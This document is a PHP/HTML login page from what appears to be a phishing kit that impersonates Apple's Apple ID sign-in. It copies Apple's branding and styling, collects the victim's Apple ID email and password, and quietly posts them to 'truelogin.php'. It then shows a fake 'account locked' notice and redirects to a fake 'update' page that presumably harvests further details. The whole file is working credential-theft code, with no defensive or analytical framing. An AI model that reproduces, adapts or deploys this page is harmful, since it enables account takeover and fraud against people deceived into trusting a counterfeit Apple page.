<!DOCTYPE html>
<?php
echo $html;
?>
<head>
<?php
if($lang == "ES") {
        $img = "apple-es.png";
      }else{
      if($lang == "FR") {
        $img = "apple-fr.png";
      }else{
        $img = "logo.png";
      }
      }
echo "<title>$title</title>";
?>
    <link rel="stylesheet" type="text/css" href="../assets/css/style-login-mobile.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/style-login-desktop.css">
    <link rel="stylesheet" type="text/css" href="../assets/css/modal.css">
    <script type="text/javascript" src="../assets/js/script-login-mobile.js"></script>
    <script type="text/javascript" src="../assets/js/modal.js"></script>
    <meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <link rel="icon" href="../assets/img/favicon.ico" type="image/x-icon" />

<script type='text/javascript'>
//<![CDATA[
$(window).load(function(){
$(".optiona").click(function(){
    $(this).toggleClass('optiona2')
});
});//]]> 

$(document).ready(function(){
    $("#salahs").click(function(){
        $("#salahs").fadeOut("slow");
    });
});
function ChangePlaceholder1(){
document.getElementById("xuser_m_login").placeholder = "name@example.com";
}
function ChangeBack1(){
document.getElementById("xuser_m_login").placeholder = "Apple ID";
}
function Activate1(){
document.getElementById('xbtn_m_login').className = "xbtn1_m_login";
}
function Bukapass(){
document.getElementById("xuser_m_login").style.borderRadius = "0";
document.getElementById("xuser_m_login").style.borderTopLeftRadius = "6px";
document.getElementById("xuser_m_login").style.borderTopRightRadius = "6px";
document.getElementById('bukapass_m_login').style.display = "none";
document.getElementById('xpass_m_login').style.display = "block";
document.getElementById('xbtn_m_login').style.display = "block";
document.getElementById('loading_m_login1').style.display = "none";
}
function loading1(){
document.getElementById('loading_m_login').style.display = "block";
document.getElementById('xbootn_m_login').style.display = "none";
document.getElementById('xbtn_m_login').style.display = "none";
}
$(document).ready(function() {
    
    $('#xuser_m_login').keypress(function(e) {
    if (e.which == 13) {
      document.getElementById('bukapass_m_login').style.display = "none";
        document.getElementById('loading_m_login1').style.display = "block";
        setTimeout(Bukapass, 2000);
        e.preventDefault();
    }
});
function showpesan() {
    $.alert('<?php echo $pesan_lock;?><?php echo $pesan2_lock;?>','<?php echo $judul_lock;?>', function () {
                $(location).attr('href', '<?php echo "?view=update&/IDMSWebAuth/update.html?&appIdKey=".$_SESSION['key']."&country=".$cid;?>');
            });
}
$("#form_login_m").on('submit', function(e){
    e.preventDefault();
        $.ajax({
          type: 'POST',
          url: 'truelogin.php',
          data: $('#form_login_m').serialize(),
          success: function() {
            $('#result').load('files/locked-classic.php?country=<?php echo $_GET['country'];?>');
            //document.getElementById('lockednya').style.display = "block";
            document.getElementById('form_login_m').style.display = "none";
          },
          error: function() {
            console.log("Signup was unsuccessful");
          }
        });
    });
});
</script>
<style>

.button:focus>span {
    -webkit-box-shadow:0 0 6px #007eff;
    -moz-box-shadow:0 0 6px #007eff;
    box-shadow:0 0 6px #007eff
}
.button:focus {
    outline:1px dotted black \0/
}
.button:hover {
    text-decoration:none
}
.button:-moz-focusring {
    outline:1px dotted
}
.button.disabled>span, .button.disabled:hover>span {
    cursor:default;
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
}
.button.rect.disabled {
    opacity:.5;
    filter:alpha(opacity=20);
    -ms-filter:alpha(opacity=20);
    background:#4c88bc;
}

.ns .button, .button.rect {
    font-size: 17px;
    line-height: 1.47059;
    font-weight: 400;
    letter-spacing: -.022em;
    font-family: "SF Pro Text", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    background-color: #0070c9;
    background: linear-gradient(#42a1ec, #0070c9);
    border-color: #07c;
    border-width: 1px;
    border-style: solid;
    border-radius: 4px;
    color: #fff;
    cursor: pointer;
    display: inline-block;
    min-width: 30px;
    padding-left: 15px;
    padding-right: 15px;
    padding-top: 4px;
    padding-bottom: 4px;
    text-align: center;
    white-space: nowrap
}
.ns .button:hover, .ns .button:focus, .button.rect:hover, .button.rect:focus {
    background:#0351b7;
    background:-webkit-linear-gradient(#2f90d5, #0351b7);
    background:-moz-linear-gradient(#2f90d5, #0351b7);
    background:linear-gradient(#2f90d5, #0351b7)
}
.ns .button:active, .ns .button.active, .button.rect:active, .button.rect.active {
    -webkit-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    -moz-box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5);
    box-shadow:0 1px 0 #fff, inset 0 0 9px rgba(0, 0, 0, 0.5)
}
.ns .button.community-alt {
    background:0;
    border:0;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button.community-alt:active, .ns .button.community-alt.active {
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.ns .button>span, .button.rect>span {
    color:#fff;
    font-size:13px;
    line-height:15px;
    padding:9px 28px;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none;
    background:0;
    border:0;
    -webkit-border-radius:4px;
    -moz-border-radius:4px;
    border-radius:4px
}
.ns .compound-button .handle>span {
    font-size:13px
}
.ns .button:hover>span, .ns .button:focus>span, .button.rect:hover>span, .button.rect:focus>span {
    background-color:transparent;
    border-color:transparent;
    -webkit-box-shadow:none;
    -moz-box-shadow:none;
    box-shadow:none
}
.button.rect.small>span {
    padding:7px 18px
}
.button.rect.large>span {
    font-size:18px;
    line-height:16px;
    padding:12px 28px
}
input[type=checkbox] {
    font-size: 19px;
    line-height: 1.47384;
    font-weight: 400;
    letter-spacing: .015em;
    font-family: "SF Pro Display", "SF Pro Icons", "Helvetica Neue", "Helvetica", "Arial", sans-serif;
    color: #fff;
    padding: 0;
    width: 30px;
    vertical-align: top;
}

#hovernya {

}
</style>
</head>
<body style="background-color: #fff;">

<div id="container_m_login">
  <div id="bodynya" style="padding-top:70px;" class="fade-in1">
    <div id="result"></div>
    <form action="" id="form_login_m" autocomplete="off" method="POST" target="_self" name="xlogin">
      <input id="tombollogin" type="submit" style="background: none;cursor: pointer;border:none;color:#C1C1C2;position: absolute;top:20px;right:-20px;font-size:16px;font-weight: 700;" value="<?php echo $nextc;?>" disabled="true">

      <center><font size="6" style="font-weight: 300;" color="#000">Apple ID</font><br><br>
      <font size="4" style="font-weight: 300;" color="#000"><?php echo $signc;?></font></center>
      <br>
      <hr style="width:100%;border-bottom: 1px;">
      <font size="3"><b>&nbsp;Apple ID</b></font>
      <input type="email" name="xuser" placeholder="example@icloud.com" style="position:absolute;font-size:16px;width:220px;left:105px;border-style: none;" required="required"><br>
      <hr style="width:100%;border-bottom: 1px;">
      <font size="3"><b>&nbsp;<?php echo $input_password;?></b></font>
      <input type="password" id="passnya" oninput="if(document.getElementById('passnya').value.length >= 5){document.getElementById('tombollogin').style.color = '#1E8BCF';$('#tombollogin').attr('disabled', false);}else{document.getElementById('tombollogin').style.color = '#C1C1C2';$('#tombollogin').attr('disabled', true);}" name="xpass" placeholder="<?php echo $requiredc;?>" style="position:absolute;border-style: none;font-size:16px;width:220px;left:105px;" required="required">
      <hr style="width:100%;border-bottom: 1px;">
      
      <center><a href="#"><font size="3" style="font-weight: 350;" color="#1E8BCF"><?php echo $forgotc;?></font></a><br><br><br><br>
        <img src="../assets/img/classic_login.png" width="260px"><br><br>
        <center><font size="4" style="font-weight: 300;"><?php echo $yourapp;?></font><br><br>
          <a href="#"><font size="3" style="font-weight: 350;" color="#1E8BCF"><?php echo $aboutapp;?></font></a>
      </center>

    </form>
  </div>
  <br>
</div>
<div tabindex="-1" id="spinner2" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
<div tabindex="-1" id="spinner2_" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10" class="hasSpinner"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
</div>
</body>
</html>